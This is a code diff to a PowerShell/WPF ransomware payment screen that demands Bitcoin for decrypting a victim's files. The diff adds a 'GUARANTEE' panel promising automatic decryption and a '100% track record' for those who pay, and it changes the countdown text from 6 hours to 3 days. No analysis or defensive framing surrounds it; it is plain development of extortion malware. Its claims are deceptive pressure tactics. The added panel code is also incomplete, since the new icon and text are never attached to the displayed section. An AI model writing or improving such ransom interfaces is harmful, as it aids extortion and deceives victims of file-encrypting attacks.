@@ -92,6 +92,35 @@ function Show-BitcoinInstructions {
     $infoText.TextWrapping = 'Wrap'
     $infoSection.Child = $infoText
     $stackPanel.Children.Add($infoSection)
+
+    # Assurance section - Blue panel
+$assuranceSection = New-Object System.Windows.Controls.Border
+$assuranceSection.Background = [System.Windows.Media.Brushes]::LightBlue
+$assuranceSection.BorderBrush = [System.Windows.Media.Brushes]::RoyalBlue
+$assuranceSection.BorderThickness = '2,2,2,2'
+$assuranceSection.CornerRadius = '5,5,5,5'
+$assuranceSection.Padding = '15,15,15,15'
+$assuranceSection.Margin = '0,0,0,20'
+
+$assuranceStack = New-Object System.Windows.Controls.StackPanel
+$assuranceStack.Orientation = 'Horizontal'
+$assuranceStack.Margin = '0,0,0,0'
+
+# Assurance icon
+$assuranceIcon = New-Object System.Windows.Controls.TextBlock
+$assuranceIcon.Text = "✅"
+$assuranceIcon.FontSize = 20
+$assuranceIcon.Margin = '0,0,10,0'
+$assuranceIcon.VerticalAlignment = 'Top'
+
+# Assurance text
+$assuranceText = New-Object System.Windows.Controls.TextBlock
+$assuranceText.Text = "GUARANTEE: Once Bitcoin payment is received and confirmed, your files will be automatically decrypted and full system access will be restored immediately. We have a 100% track record of restoring access for users who pay the ransom."
+$assuranceText.FontSize = 12
+$assuranceText.FontWeight = [System.Windows.FontWeights]::Bold
+$assuranceText.TextWrapping = 'Wrap'
+$assuranceText.Foreground = [System.Windows.Media.Brushes]::DarkBlue
+$stackPanel.Children.Add($assuranceSection)
     
     # What You Need section
     $needsHeader = New-Object System.Windows.Controls.TextBlock
@@ -550,7 +579,7 @@ $section2Title.VerticalAlignment = 'Center'
 
 # Section 2 Content - Updated with Bitcoin instructions link
 $section2Content = New-Object System.Windows.Controls.TextBlock
-$section2Content.Text = "We guarantee 100% file recovery upon payment. Your files have been backed up to our secure servers. For more information click the 'How to Buy Bitcoins' button below. Failure to pay within 6 hours will result in:"
+$section2Content.Text = "We guarantee 100% file recovery upon payment. Your files have been backed up to our secure servers. For more information click the 'How to Buy Bitcoins' button below. Failure to pay within 3 days will result in:"
 $section2Content.Foreground = [System.Windows.Media.Brushes]::White
 $section2Content.FontFamily = 'Segoe UI'
 $section2Content.FontSize = 13
@@ -630,7 +659,7 @@ $paymentStack.HorizontalAlignment = 'Center'
 
 # Payment Panel Title
 $paymentTitle = New-Object System.Windows.Controls.TextBlock
-$paymentTitle.Text = "BITCOIN PAYMENT REQUIRED"
+$paymentTitle.Text = "BITCOIN PAYMENT REQUIRED - DUE IN 3 DAYS"
 $paymentTitle.Foreground = [System.Windows.Media.Brushes]::Gold
 $paymentTitle.FontFamily = 'Segoe UI'
 $paymentTitle.FontSize = 22
@@ -734,7 +763,7 @@ $addressPanel.Child = $addressStack
 
 # Time Warning
 $timeWarning = New-Object System.Windows.Controls.TextBlock
-$timeWarning.Text = "⏰ YOU HAVE 6 HOURS"
+$timeWarning.Text = "⏰ YOU HAVE 3 DAYS"
 $timeWarning.Foreground = [System.Windows.Media.Brushes]::Red
 $timeWarning.FontSize = 14
 $timeWarning.FontWeight = 'Bold'
